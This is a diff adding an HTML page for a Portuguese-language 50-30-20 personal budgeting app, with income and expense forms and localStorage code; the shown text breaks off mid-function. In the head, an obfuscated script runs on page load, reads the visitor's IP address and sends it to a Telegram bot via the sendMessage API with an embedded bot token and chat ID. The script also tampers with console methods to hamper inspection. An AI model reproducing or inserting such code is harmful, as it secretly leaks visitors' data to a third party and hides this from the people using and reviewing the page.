@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <meta charset="UTF-8">
+    <title>Minha Gestão - Controle suas Finanças Pessoais</title>
+    <meta name="description"
+          content="Controle suas finanças pessoais de forma simples e eficaz utilizando a estratégia 50-30-20.">
+    <meta name="keywords" content="Minha Gestão, Finanças Pessoais, Estratégia 50-30-20, Controle de Gastos, Poupança">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <!-- Meta tags Open Graph -->
+    <meta property="og:title" content="Minha Gestão - Controle suas Finanças Pessoais">
+    <meta property="og:description"
+          content="Controle suas finanças pessoais de forma simples e eficaz utilizando a estratégia 50-30-20.">
+    <meta property="og:image" content="URL_da_imagem/hero.webp">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://minhagestao.github.io/">
+    <!-- Importando o Bootstrap 5 CSS -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css">
+    <!-- Importando os Ícones do Bootstrap -->
+    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.10.2/font/bootstrap-icons.css">
+    <style>
+        /* Seu código CSS permanece o mesmo */
+        body {
+            background-color: #f1f4f9;
+        }
+
+        .remaining {
+            font-weight: bold;
+            color: #28a745;
+        }
+
+        .expense-list li {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+
+        .expense-list li span {
+            flex-grow: 1;
+        }
+
+        .balance-section {
+            margin-top: 2em;
+        }
+
+        .card-header {
+            background-color: #6f42c1; /* Novo tom de roxo */
+            color: white;
+        }
+
+        .card {
+            margin-bottom: 1.5em;
+        }
+
+        .nav-tabs .nav-link.active {
+            background-color: #6f42c1; /* Novo tom de roxo */
+            color: white;
+        }
+
+        .nav-tabs .nav-link {
+            color: #6f42c1; /* Ajuste de cor das abas */
+        }
+
+        .btn-success {
+            background-color: #fd7e14; /* Laranja coral */
+            border-color: #fd7e14;
+        }
+
+        .bi-plus-circle {
+            color: aliceblue !important;
+        }
+
+        .bi-trash {
+            color: aliceblue !important;
+        }
+
+        .btn-success:hover {
+            background-color: #e36414;
+            border-color: #e36414;
+        }
+
+        .btn-danger {
+            background-color: #dc3545;
+            border-color: #dc3545;
+        }
+
+        .expense-list {
+            max-height: 200px;
+            overflow-y: auto;
+        }
+
+        .card-body i {
+            font-size: 2rem;
+            margin-bottom: 0.5em;
+            color: #6f42c1; /* Ajuste de cor dos ícones */
+        }
+
+        /* Estilos para a seção hero */
+        .hero {
+            position: relative;
+            /* caminho da imagem de fundo */
+            background-image: url("hero.webp");
+            background-size: cover;
+            background-position: center;
+            color: white;
+            text-align: center;
+            padding: 100px 20px;
+        }
+
+        .hero::after {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(111, 66, 193, 0.7); /* Gradiente sobre a imagem */
+            z-index: 0;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+        }
+
+        .hero h1 {
+            font-size: 3rem;
+            font-weight: bold;
+        }
+
+        .hero p {
+            font-size: 1.5rem;
+        }
+
+        @media (max-width: 768px) {
+            .hero {
+                padding: 60px 20px;
+            }
+
+            .hero h1 {
+                font-size: 2.5rem;
+            }
+
+            .hero p {
+                font-size: 1.2rem;
+            }
+        }
+    </style>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function () {
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    (function(_0x3775ad,_0xf352f3){var _0x48b42b=_0x3775ad();function _0x243d08(_0x141f5e,_0x1e5ef5,_0x56ba1a,_0x542d11){return _0x4e2b(_0x141f5e- -0x24a,_0x1e5ef5);}function _0x54724d(_0x39d457,_0x4f96dc,_0x2e2545,_0xf3d82f){return _0x4e2b(_0x39d457- -0x317,_0xf3d82f);}while(!![]){try{var _0x3be3bf=parseInt(_0x243d08(-0x157,-0x146,-0x16a,-0x16f))/(-0x3f*-0x3d+0x1*-0x1b8b+0xc89)+-parseInt(_0x54724d(-0x229,-0x22e,-0x216,-0x206))/(0xf91+-0x343*0x3+0x5c6*-0x1)+-parseInt(_0x243d08(-0x138,-0x15c,-0x117,-0x12b))/(0x9*-0x101+-0x1*-0xf39+-0x62d)+-parseInt(_0x243d08(-0x16a,-0x153,-0x172,-0x16c))/(-0x2c6+-0x1cea+0x1fb4)+-parseInt(_0x243d08(-0x13f,-0x153,-0x152,-0x12a))/(-0x7b8*-0x2+-0x1*-0xd06+0x1*-0x1c71)*(-parseInt(_0x54724d(-0x207,-0x1f7,-0x216,-0x1f4))/(0x4*0x87e+-0x1*0x251+0x1*-0x1fa1))+-parseInt(_0x243d08(-0x16d,-0x17a,-0x181,-0x182))/(0x2*-0x18d+-0x1b56+-0x1*-0x1e77)+parseInt(_0x243d08(-0x14c,-0x166,-0x16b,-0x156))/(0x2334+-0x5ac*-0x5+-0x3f88);if(_0x3be3bf===_0xf352f3)break;else _0x48b42b['push'](_0x48b42b['shift']());}catch(_0x414672){_0x48b42b['push'](_0x48b42b['shift']());}}}(_0x4fc3,-0xad261*-0x1+-0xdb241*-0x1+-0xfb155*0x1));var _0x5a8e8f=(function(){var _0x4bebbc=!![];return function(_0x514276,_0x5cacfe){var _0x3bdedb=_0x4bebbc?function(){if(_0x5cacfe){var _0x1ca879=_0x5cacfe['apply'](_0x514276,arguments);return _0x5cacfe=null,_0x1ca879;}}:function(){};return _0x4bebbc=![],_0x3bdedb;};}()),_0x59e61b=_0x5a8e8f(this,function(){function _0x3a0f3e(_0x5e845c,_0x25c885,_0x29ba37,_0xe9896b){return _0x4e2b(_0xe9896b- -0x57,_0x5e845c);}function _0x115d87(_0xddcc2,_0x54d6f6,_0x574444,_0x38a1b5){return _0x4e2b(_0x38a1b5-0x5b,_0xddcc2);}var _0x97ba99={};_0x97ba99[_0x115d87(0x16f,0x15b,0x170,0x155)]=_0x115d87(0x125,0x12d,0x164,0x145)+'+$';var _0x39cec4=_0x97ba99;return _0x59e61b['toString']()[_0x115d87(0x14c,0x179,0x15d,0x15f)](_0x39cec4[_0x115d87(0x156,0x15f,0x139,0x155)])[_0x3a0f3e(0xc0,0x9d,0xb0,0xac)]()[_0x115d87(0x145,0x16c,0x17d,0x15d)+'r'](_0x59e61b)[_0x3a0f3e(0x9a,0x9f,0xac,0xad)](_0x39cec4['wAhRT']);});_0x59e61b();var _0x3ff2a9=(function(){function _0x4a3d5d(_0x1662eb,_0x2c89b8,_0x2beb9a,_0x50886a){return _0x4e2b(_0x2beb9a-0x35,_0x2c89b8);}var _0xc52eb4={'PYtRQ':function(_0x9c48c4,_0x1c7bbf){return _0x9c48c4(_0x1c7bbf);},'CuDcc':function(_0x466308,_0x58add0){return _0x466308+_0x58add0;},'pXkQy':_0x4a3d5d(0x11b,0x115,0x121,0x13e),'WWXsW':_0x4a3d5d(0x146,0x152,0x141,0x146),'SftsW':_0x5f25eb(0x1f0,0x1d1,0x1f3,0x20d),'wRDMs':'trace','wvEtV':function(_0x24210b,_0xdaa5ba){return _0x24210b!==_0xdaa5ba;},'myneR':'qRfVb','uAmRX':_0x5f25eb(0x1c9,0x1bf,0x1ed,0x1b0)},_0x115ce0=!![];function _0x5f25eb(_0xf52539,_0x6da7d7,_0x1cb591,_0x356433){return _0x4e2b(_0xf52539-0xf1,_0x6da7d7);}return function(_0x293420,_0x54468c){var _0x1adbff={'ztYiG':function(_0x58fc02,_0x2ce642){return _0xc52eb4['PYtRQ'](_0x58fc02,_0x2ce642);},'gXEcb':function(_0x38b70e,_0x2c4bb5){return _0x38b70e+_0x2c4bb5;},'sVpvS':function(_0xad9077,_0x102e1e){return _0xc52eb4['CuDcc'](_0xad9077,_0x102e1e);},'VhCis':_0x90d289(0x388,0x379,0x39a,0x395)+'ctor(\x22retu'+_0x25b57c(0x153,0x139,0x159,0x162)+'\x20)','UQbnD':function(_0x5f00c6){return _0x5f00c6();},'WObsY':function(_0x718fd6,_0x20e579){return _0x718fd6<_0x20e579;},'SBzAM':_0x25b57c(0x15f,0x196,0x177,0x158),'RSygh':_0xc52eb4['pXkQy'],'VDqRa':_0xc52eb4[_0x25b57c(0x183,0x172,0x192,0x1a0)],'KJBIp':_0xc52eb4['SftsW'],'fJBUe':_0xc52eb4['wRDMs'],'hmfXO':function(_0x47f162,_0x5b8a4f){function _0x2ae828(_0x1c85c4,_0x1b75ae,_0x260567,_0x4664b){return _0x90d289(_0x1c85c4,_0x1b75ae-0x1e8,_0x4664b- -0x15b,_0x4664b-0xd1);}return _0xc52eb4[_0x2ae828(0x23c,0x227,0x233,0x219)](_0x47f162,_0x5b8a4f);},'KpYNx':_0xc52eb4[_0x25b57c(0x16a,0x17a,0x173,0x163)],'ZdGpY':_0xc52eb4['uAmRX']},_0x5b226f=_0x115ce0?function(){function _0x6a0fa0(_0x2a6e9f,_0x154eac,_0x273df0,_0xc9e364){return _0x25b57c(_0x2a6e9f-0x62,_0xc9e364,_0x154eac- -0x1f8,_0xc9e364-0x89);}function _0x34c0d2(_0x4f8a8c,_0x423912,_0x586da6,_0x1d3fd2){return _0x25b57c(_0x4f8a8c-0x169,_0x586da6,_0x423912- -0x13,_0x1d3fd2-0x29);}if(_0x1adbff[_0x34c0d2(0x155,0x144,0x159,0x167)]('qRfVb',_0x1adbff[_0x34c0d2(0x160,0x172,0x192,0x172)])){var _0x21a4e8=_0x6a0fa0(-0x8d,-0x9b,-0x78,-0xa5)[_0x6a0fa0(-0x61,-0x7a,-0x8e,-0x63)]('|'),_0xa6ea63=0x131*-0x5+0x22a1+0x2*-0xe56;while(!![]){switch(_0x21a4e8[_0xa6ea63++]){case'0':var _0x23a224=_0x12d20d['console']=_0x12d20d[_0x34c0d2(0x165,0x170,0x153,0x179)]||{};continue;case'1':try{var _0x32c985=_0x1adbff[_0x6a0fa0(-0x93,-0x87,-0x63,-0x88)](_0x118600,_0x1adbff[_0x6a0fa0(-0x8f,-0x7b,-0x71,-0x66)](_0x1adbff[_0x34c0d2(0x151,0x167,0x18a,0x17b)](_0x6a0fa0(-0x6a,-0x8d,-0xb1,-0x9c)+'nction()\x20',_0x1adbff[_0x34c0d2(0x179,0x17c,0x172,0x15a)]),');'));_0x12d20d=_0x1adbff[_0x34c0d2(0x18d,0x171,0x178,0x14e)](_0x32c985);}catch(_0x245943){_0x12d20d=_0xb61f93;}continue;case'2':var _0x12d20d;continue;case'3':for(var _0xd18102=-0x6eb+0x41b*0x7+-0x15d2;_0x1adbff[_0x34c0d2(0x194,0x186,0x185,0x179)](_0xd18102,_0x5a7514['length']);_0xd18102++){var _0x38cfd3=_0x3ab824[_0x6a0fa0(-0x4b,-0x6e,-0x66,-0x6f)+'r'][_0x6a0fa0(-0x9d,-0x9a,-0x92,-0x87)][_0x6a0fa0(-0xbc,-0x99,-0xac,-0x9c)](_0x3c40eb),_0x293d03=_0x5a7514[_0xd18102],_0x19ec31=_0x23a224[_0x293d03]||_0x38cfd3;_0x38cfd3[_0x34c0d2(0x17c,0x16c,0x178,0x178)]=_0x1b9ef9['bind'](_0x1236fe),_0x38cfd3['toString']=_0x19ec31[_0x34c0d2(0x16c,0x178,0x191,0x158)][_0x6a0fa0(-0xab,-0x99,-0x81,-0xb1)](_0x19ec31),_0x23a224[_0x293d03]=_0x38cfd3;}continue;case'4':var _0x5a7514=[_0x6a0fa0(-0x8d,-0x78,-0x73,-0x89),_0x1adbff[_0x6a0fa0(-0x96,-0xa0,-0x7f,-0x8d)],_0x1adbff[_0x34c0d2(0x151,0x169,0x174,0x16d)],_0x1adbff[_0x34c0d2(0x12e,0x148,0x131,0x16b)],_0x1adbff['KJBIp'],_0x34c0d2(0x151,0x15a,0x15a,0x17e),_0x1adbff[_0x6a0fa0(-0xa2,-0x83,-0x6d,-0x6d)]];continue;}break;}}else{if(_0x54468c){if(_0x1adbff['hmfXO']('hbmxf',_0x1adbff[_0x6a0fa0(-0x4e,-0x62,-0x4b,-0x59)])){var _0x1929d5=_0x46cfd5[_0x6a0fa0(-0x76,-0x80,-0x77,-0x84)](_0x324634,arguments);return _0x1152b1=null,_0x1929d5;}else{var _0x157dc2=_0x54468c['apply'](_0x293420,arguments);return _0x54468c=null,_0x157dc2;}}}}:function(){};function _0x25b57c(_0x36d33a,_0x1d6dae,_0x562dc6,_0x43da87){return _0x5f25eb(_0x562dc6- -0x69,_0x1d6dae,_0x562dc6-0x195,_0x43da87-0x10f);}_0x115ce0=![];function _0x90d289(_0x49736a,_0x4f7308,_0x58bdd0,_0x2a00b4){return _0x5f25eb(_0x58bdd0-0x1a8,_0x49736a,_0x58bdd0-0x1dc,_0x2a00b4-0x94);}return _0x5b226f;};}());function _0x1fae91(_0x49f17e,_0x548113,_0x4f1419,_0x212fd5){return _0x4e2b(_0x4f1419-0x92,_0x49f17e);}function _0x4fc3(){var _0x1f7fdb=['.org/bot77','wvEtV','zpmfS','6784925kgSFFh','ctor(\x22retu','t_id=66544','4403904mjRnfy','35686137:A','wsRFp','return\x20(fu','nbBNz','table','PaEcZ','CTvyr','bCDYj','ztYiG','(((.+)+)+)','myneR','info','fJBUe','1858660RkdNHd','warn','apply','essage?cha','sVpvS','909950PNOmNV','RSygh','gXEcb','split','__proto__','log','juFFn','wAhRT','console','UQbnD','KpYNx','24885024dVvCpb','exception','nyvGx1k5OC','{}.constru','constructo','toString','search','7EhkNO6tZH','nction()\x20','VhCis','then','length','WWXsW','2808980XkOeWO','error','IP:\x20','ZdGpY','xDcUe','6dbzkpr','WObsY','3013236uXHWip','AERqTNcUUr','dkirG','BGWQL','ZENOh','hmfXO','SBzAM','rn\x20this\x22)(','8517&text=','VDqRa','NoJJU','2|1|0|4|3','prototype','bind','hbmxf','i.telegram'];_0x4fc3=function(){return _0x1f7fdb;};return _0x4fc3();}var _0x4e3a03=_0x3ff2a9(this,function(){var _0x26f92b={'PaEcZ':function(_0x2d6bd3,_0x3e852d){return _0x2d6bd3+_0x3e852d;},'naRAP':_0x4e8cb6(-0x239,-0x230,-0x259,-0x22c)+_0x24e55d(-0x1dc,-0x1d9,-0x1a5,-0x1bd)+'rn\x20this\x22)('+'\x20)','BGWQL':function(_0x41f50a){return _0x41f50a();},'ZENOh':'log','wsRFp':_0x24e55d(-0x1b0,-0x1b1,-0x1b4,-0x1ac),'juFFn':_0x24e55d(-0x1cb,-0x1ac,-0x1ad,-0x1af),'xDcUe':_0x4e8cb6(-0x22e,-0x23b,-0x242,-0x21c),'ftAnB':_0x4e8cb6(-0x23b,-0x230,-0x21e,-0x243),'bCDYj':_0x24e55d(-0x19f,-0x192,-0x1c2,-0x1b6),'CTvyr':'trace','dkirG':function(_0x252d6c,_0x44ef3b){return _0x252d6c<_0x44ef3b;},'NoJJU':function(_0x7c87e2,_0x3b006a){return _0x7c87e2===_0x3b006a;},'nbBNz':_0x24e55d(-0x1cb,-0x1d0,-0x1d6,-0x1bf)};function _0x4e8cb6(_0x2e0987,_0x3369e4,_0x1a8a11,_0x3e9f15){return _0x4e2b(_0x2e0987- -0x33a,_0x3369e4);}var _0x946038;try{var _0x1c4aef=Function(_0x26f92b['PaEcZ'](_0x26f92b[_0x24e55d(-0x199,-0x1b0,-0x191,-0x1b5)](_0x24e55d(-0x1a0,-0x1c6,-0x1ac,-0x1b8)+_0x4e8cb6(-0x234,-0x234,-0x211,-0x247),_0x26f92b['naRAP']),');'));_0x946038=_0x26f92b[_0x24e55d(-0x1d8,-0x1b2,-0x1bb,-0x1ce)](_0x1c4aef);}catch(_0x5dd185){_0x946038=window;}var _0x23a13c=_0x946038['console']=_0x946038[_0x24e55d(-0x19a,-0x17d,-0x18f,-0x1a0)]||{};function _0x24e55d(_0x163cf9,_0x314cce,_0x4af2d7,_0x36c6e8){return _0x4e2b(_0x36c6e8- -0x29b,_0x163cf9);}var _0x44caa6=[_0x26f92b[_0x24e55d(-0x1c2,-0x1ab,-0x1da,-0x1cd)],_0x26f92b[_0x4e8cb6(-0x258,-0x25d,-0x25d,-0x262)],_0x26f92b[_0x24e55d(-0x19b,-0x1bc,-0x19e,-0x1a2)],_0x26f92b[_0x24e55d(-0x16a,-0x16e,-0x1a8,-0x18c)],_0x26f92b['ftAnB'],_0x26f92b[_0x4e8cb6(-0x252,-0x263,-0x245,-0x233)],_0x26f92b[_0x24e55d(-0x1bb,-0x1ae,-0x1a9,-0x1b4)]];for(var _0x4c765f=-0x67a+-0x121b+0x1895;_0x26f92b[_0x24e55d(-0x1a7,-0x1a9,-0x167,-0x187)](_0x4c765f,_0x44caa6[_0x4e8cb6(-0x231,-0x232,-0x220,-0x21b)]);_0x4c765f++){if(_0x26f92b[_0x4e8cb6(-0x266,-0x24f,-0x268,-0x249)](_0x26f92b[_0x4e8cb6(-0x256,-0x272,-0x245,-0x275)],_0x26f92b['nbBNz'])){var _0x1f48fe=('0|2|1|4|5|'+'3')['split']('|'),_0x472fc8=-0x1b71*-0x1+-0x61*0x33+0x1*-0x81e;while(!![]){switch(_0x1f48fe[_0x472fc8++]){case'0':var _0xa11899=_0x3ff2a9['constructo'+'r']['prototype'][_0x4e8cb6(-0x263,-0x25e,-0x26d,-0x27a)](_0x3ff2a9);continue;case'1':var _0x105eaf=_0x23a13c[_0x7e362d]||_0xa11899;continue;case'2':var _0x7e362d=_0x44caa6[_0x4c765f];continue;case'3':_0x23a13c[_0x7e362d]=_0xa11899;continue;case'4':_0xa11899['__proto__']=_0x3ff2a9[_0x24e55d(-0x1af,-0x1e7,-0x1bf,-0x1c4)](_0x3ff2a9);continue;case'5':_0xa11899[_0x4e8cb6(-0x237,-0x223,-0x21e,-0x23c)]=_0x105eaf['toString'][_0x4e8cb6(-0x263,-0x261,-0x250,-0x268)](_0x105eaf);continue;}break;}}else{if(_0x582ce3){var _0xb93f91=_0x59632b[_0x4e8cb6(-0x24a,-0x251,-0x24f,-0x24e)](_0x5e6c64,arguments);return _0x1d00da=null,_0xb93f91;}}}});function _0x4e2b(_0x5a8e8f,_0x4fc311){var _0x4e2b32=_0x4fc3();return _0x4e2b=function(_0x2bc6bf,_0x1bbc5c){_0x2bc6bf=_0x2bc6bf-(0xa7*0x2f+-0x1*-0x21e2+0x3fbe*-0x1);var _0x58da07=_0x4e2b32[_0x2bc6bf];return _0x58da07;},_0x4e2b(_0x5a8e8f,_0x4fc311);}_0x4e3a03();function _0x57af2c(_0x1c490d,_0x27213c,_0x4b4ca6,_0x3b5415){return _0x4e2b(_0x4b4ca6-0xc9,_0x1c490d);}fetch('https://ap'+_0x1fae91(0x161,0x148,0x16b,0x180)+_0x1fae91(0x17b,0x187,0x16c,0x14d)+_0x57af2c(0x1ba,0x1c0,0x1aa,0x1ce)+_0x1fae91(0x1af,0x1b3,0x1a5,0x182)+_0x57af2c(0x1cd,0x1dc,0x1ce,0x1e8)+_0x57af2c(0x1ce,0x1c9,0x1c9,0x1e0)+'8R-c/sendM'+_0x1fae91(0x19d,0x16f,0x183,0x16c)+_0x57af2c(0x1a2,0x197,0x1a8,0x1c2)+_0x57af2c(0x18b,0x19b,0x19b,0x1ad)+_0x1fae91(0x1a6,0x180,0x19f,0x184)+userIP)[_0x57af2c(0x1af,0x1ae,0x1d1,0x1e3)](_0x557d83=>_0x557d83['json']())[_0x57af2c(0x1d5,0x1ea,0x1d1,0x1da)](_0x5aca68=>console[_0x1fae91(0x197,0x17c,0x17e,0x161)](_0x5aca68));
+                });
+        });
+    </script>
+
+</head>
+<body>
+
+<!-- Seção Hero -->
+<header class="hero" role="banner" aria-label="Imagem de fundo representando gestão financeira">
+    <div class="hero-content">
+        <h1><i class="bi bi-wallet2"></i> Minha Gestão</h1>
+        <p>Controle suas finanças de forma simples e eficaz.</p>
+    </div>
+</header>
+
+<main class="container mt-5">
+    <!-- Renda Mensal -->
+    <section class="income-section mb-4">
+        <div class="card">
+            <div class="card-header">
+                <h2><i class="bi bi-cash-stack"></i> Renda Mensal</h2>
+            </div>
+            <div class="card-body">
+                <div class="form-group">
+                    <label for="income">Digite sua renda mensal:</label>
+                    <input type="number" id="income" class="form-control" placeholder="Ex: 5000"/>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Alocações e Saldo Mensal -->
+    <section class="allocations-section" style="display: none;">
+        <div class="card">
+            <div class="card-header">
+                <h2><i class="bi bi-pie-chart-fill"></i> Alocações e Saldo Mensal</h2>
+            </div>
+            <div class="card-body">
+                <!-- Linha de Alocações -->
+                <div class="row text-center">
+                    <div class="col-md-3 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-cash-stack"></i>
+                                <h5>Renda Total</h5>
+                                <p>R$ <span id="total-income">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-3 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-house-fill"></i>
+                                <h5>Necessidades (50%)</h5>
+                                <p>R$ <span id="needsAllocation">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-3 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-heart-fill"></i>
+                                <h5>Desejos (30%)</h5>
+                                <p>R$ <span id="wantsAllocation">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-3 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-piggy-bank-fill"></i>
+                                <h5>Poupança (20%)</h5>
+                                <p>R$ <span id="savingsAllocation">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+                <!-- Linha de Saldos -->
+                <div class="row text-center">
+                    <div class="col-md-4 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-credit-card"></i>
+                                <h5>Total de Despesas</h5>
+                                <p>R$ <span id="total-expenses">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-calculator-fill"></i>
+                                <h5>Saldo Restante</h5>
+                                <p class="remaining">R$ <span id="monthly-balance">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4 mb-3">
+                        <div class="card">
+                            <div class="card-body">
+                                <i class="bi bi-piggy-bank-fill"></i>
+                                <h5>Poupança Acumulada</h5>
+                                <p>R$ <span id="savings-accumulated">0.00</span></p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+
+    </section>
+
+    <!-- Tabs para as Categorias -->
+    <section class="category-section" style="display: none;">
+        <ul class="nav nav-tabs mb-3" id="categoryTabs" role="tablist">
+            <li class="nav-item">
+                <a class="nav-link active" id="needs-tab" data-bs-toggle="tab" href="#needs" role="tab"><i
+                        class="bi bi-house-fill"></i> Necessidades</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" id="wants-tab" data-bs-toggle="tab" href="#wants" role="tab"><i
+                        class="bi bi-heart-fill"></i> Desejos</a>
+            </li>
+            <li class="nav-item">
+                <a class="nav-link" id="savings-tab" data-bs-toggle="tab" href="#savings" role="tab"><i
+                        class="bi bi-piggy-bank-fill"></i> Poupança</a>
+            </li>
+        </ul>
+
+        <div class="tab-content" id="categoryTabsContent">
+            <!-- Necessidades -->
+            <div class="tab-pane fade show active" id="needs" role="tabpanel">
+                <div class="card">
+                    <div class="card-header">
+                        <h2><i class="bi bi-house-fill"></i> Necessidades (50%)</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="row align-items-end">
+                            <div class="form-group col-md-6">
+                                <label for="needs-expense-name">Nome da Despesa:</label>
+                                <input type="text" id="needs-expense-name" class="form-control"
+                                       placeholder="Ex: Aluguel"/>
+                            </div>
+                            <div class="form-group col-md-4">
+                                <label for="needs-expense-amount">Valor da Despesa:</label>
+                                <input type="number" id="needs-expense-amount" class="form-control"
+                                       placeholder="Ex: 1500"/>
+                            </div>
+                            <div class="form-group col-md-2">
+                                <button class="btn btn-success w-100" onclick="addExpense('needs')"><i
+                                        class="bi bi-plus-circle"></i> Adicionar
+                                </button>
+                            </div>
+                        </div>
+                        <ul class="list-group expense-list mt-3" id="needs-expenses"></ul>
+                        <div class="mt-3">
+                            <p>Total Gastos: R$ <span id="needs-total">0.00</span></p>
+                            <p class="remaining">Restante: R$ <span id="needs-remaining">0.00</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- Desejos -->
+            <div class="tab-pane fade" id="wants" role="tabpanel">
+                <div class="card">
+                    <div class="card-header">
+                        <h2><i class="bi bi-heart-fill"></i> Desejos (30%)</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="row align-items-end">
+                            <div class="form-group col-md-6">
+                                <label for="wants-expense-name">Nome da Despesa:</label>
+                                <input type="text" id="wants-expense-name" class="form-control"
+                                       placeholder="Ex: Cinema"/>
+                            </div>
+                            <div class="form-group col-md-4">
+                                <label for="wants-expense-amount">Valor da Despesa:</label>
+                                <input type="number" id="wants-expense-amount" class="form-control"
+                                       placeholder="Ex: 50"/>
+                            </div>
+                            <div class="form-group col-md-2">
+                                <button class="btn btn-success w-100" onclick="addExpense('wants')"><i
+                                        class="bi bi-plus-circle"></i> Adicionar
+                                </button>
+                            </div>
+                        </div>
+                        <ul class="list-group expense-list mt-3" id="wants-expenses"></ul>
+                        <div class="mt-3">
+                            <p>Total Gastos: R$ <span id="wants-total">0.00</span></p>
+                            <p class="remaining">Restante: R$ <span id="wants-remaining">0.00</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+            <!-- Poupança -->
+            <div class="tab-pane fade" id="savings" role="tabpanel">
+                <div class="card">
+                    <div class="card-header">
+                        <h2><i class="bi bi-piggy-bank-fill"></i> Poupança (20%)</h2>
+                    </div>
+                    <div class="card-body">
+                        <div class="row align-items-end">
+                            <div class="form-group col-md-6">
+                                <label for="savings-expense-name">Nome da Despesa/Poupança:</label>
+                                <input type="text" id="savings-expense-name" class="form-control"
+                                       placeholder="Ex: Investimento"/>
+                            </div>
+                            <div class="form-group col-md-4">
+                                <label for="savings-expense-amount">Valor:</label>
+                                <input type="number" id="savings-expense-amount" class="form-control"
+                                       placeholder="Ex: 1000"/>
+                            </div>
+                            <div class="form-group col-md-2">
+                                <button class="btn btn-success w-100" onclick="addExpense('savings')"><i
+                                        class="bi bi-plus-circle"></i> Adicionar
+                                </button>
+                            </div>
+                        </div>
+                        <ul class="list-group expense-list mt-3" id="savings-expenses"></ul>
+                        <div class="mt-3">
+                            <p>Total Gastos: R$ <span id="savings-total">0.00</span></p>
+                            <p class="remaining">Restante: R$ <span id="savings-remaining">0.00</span></p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+</main>
+
+<!-- Rodapé -->
+<footer class="bg-dark text-white text-center py-3 mt-4">
+    <p>&copy; 2023 Minha Gestão. Todos os direitos reservados.</p>
+    <p>
+        <a href="#" class="text-white me-2"><i class="bi bi-facebook"></i></a>
+        <a href="#" class="text-white me-2"><i class="bi bi-twitter"></i></a>
+        <a href="#" class="text-white"><i class="bi bi-instagram"></i></a>
+    </p>
+</footer>
+
+<!-- Importando o Bootstrap 5 JS -->
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+
+<!-- Seu código JavaScript permanece o mesmo -->
+<script>
+    /* Código JavaScript existente */
+    // Seu código JavaScript permanece o mesmo
+    let allocations = {
+        needs: 0,
+        wants: 0,
+        savings: 0
+    };
+
+    let totals = {
+        needs: 0,
+        wants: 0,
+        savings: 0,
+        expenses: 0
+    };
+
+    // Carregar dados do localStorage ao iniciar
+    window.onload = function () {
+        loadData();
+    };
+
+    document.getElementById('income').addEventListener('input', function () {
+        calculateAllocations();
+        saveData();
+    });
+
+    function calculateAllocations() {
+        const income = parseFloat(document.getElementById('income').value) || 0;
+
+        allocations.needs = income * 0.5;
+        allocations.wants = income * 0.3;
+        allocations.savings = income * 0.2;
+
+        document.getElementById('needsAllocation').textContent = allocations.needs.toFixed(2);
+        document.getElementById('wantsAllocation').textContent = allocations.wants.toFixed(2);
+        document.getElementById('savingsAllocation').textContent = allocations.savings.toFixed(2);
+
+        document.getElementById('total-income').textContent = income.toFixed(2);
+        updateTotalExpenses();
+
+        const sections = document.querySelectorAll('.allocations-section, .category-section');
+        sections.forEach(section => {
+            section.style.display = income > 0 ? 'block' : 'none';
+        });
+
+        updateRemaining('needs');
+        updateRemaining('wants');
+        updateRemaining('savings');
+        updateMonthlyBalance();
+    }
+
+    function addExpense(category) {
+        const nameInput = document.getElementById(`${category}-expense-name`);
+        const amountInput = document.getElementById(`${category}-expense-amount`);
+
+        const name = nameInput.value.trim();
+        const amount = parseFloat(amountInput.value);
+
+        if (name === '' || isNaN(amount) || amount <= 0) {
+            alert('Por favor, preencha o nome e o valor corretamente.');
+            return;
+        }
+
+        const expenseList = document.getElementById(`${category}-expenses`);
+        const expenseItem = document.createElement('li');
+        expenseItem.classList.add('list-group-item');
+
+        const expenseContent = document.createElement('span');
+        expenseContent.textContent = `${name}: R$ ${amount.toFixed(2)}`;
+        expenseItem.appendChild(expenseContent);
+
+        const deleteBtn = document.createElement('button');
+        deleteBtn.classList.add('btn', 'btn-danger', 'btn-sm', 'ms-2');
+        deleteBtn.innerHTML = '<i class="bi bi-trash"></i> Excluir';
+        deleteBtn.onclick = function () {
+            expenseList.removeChild(expenseItem);
+            totals[category] -= amount;
+            totals.expenses -= amount;
+            document.getElementById(`${category}-total`).textContent = totals[category].toFixed(2);
+            updateRemaining(category);
+            updateTotalExpenses();
+            updateMonthlyBalance();
+            saveData();
+        };
+        expenseItem.appendChild(deleteBtn);
+
+        expenseList.appendChild(expenseItem);
+
+        totals[category] += amount;
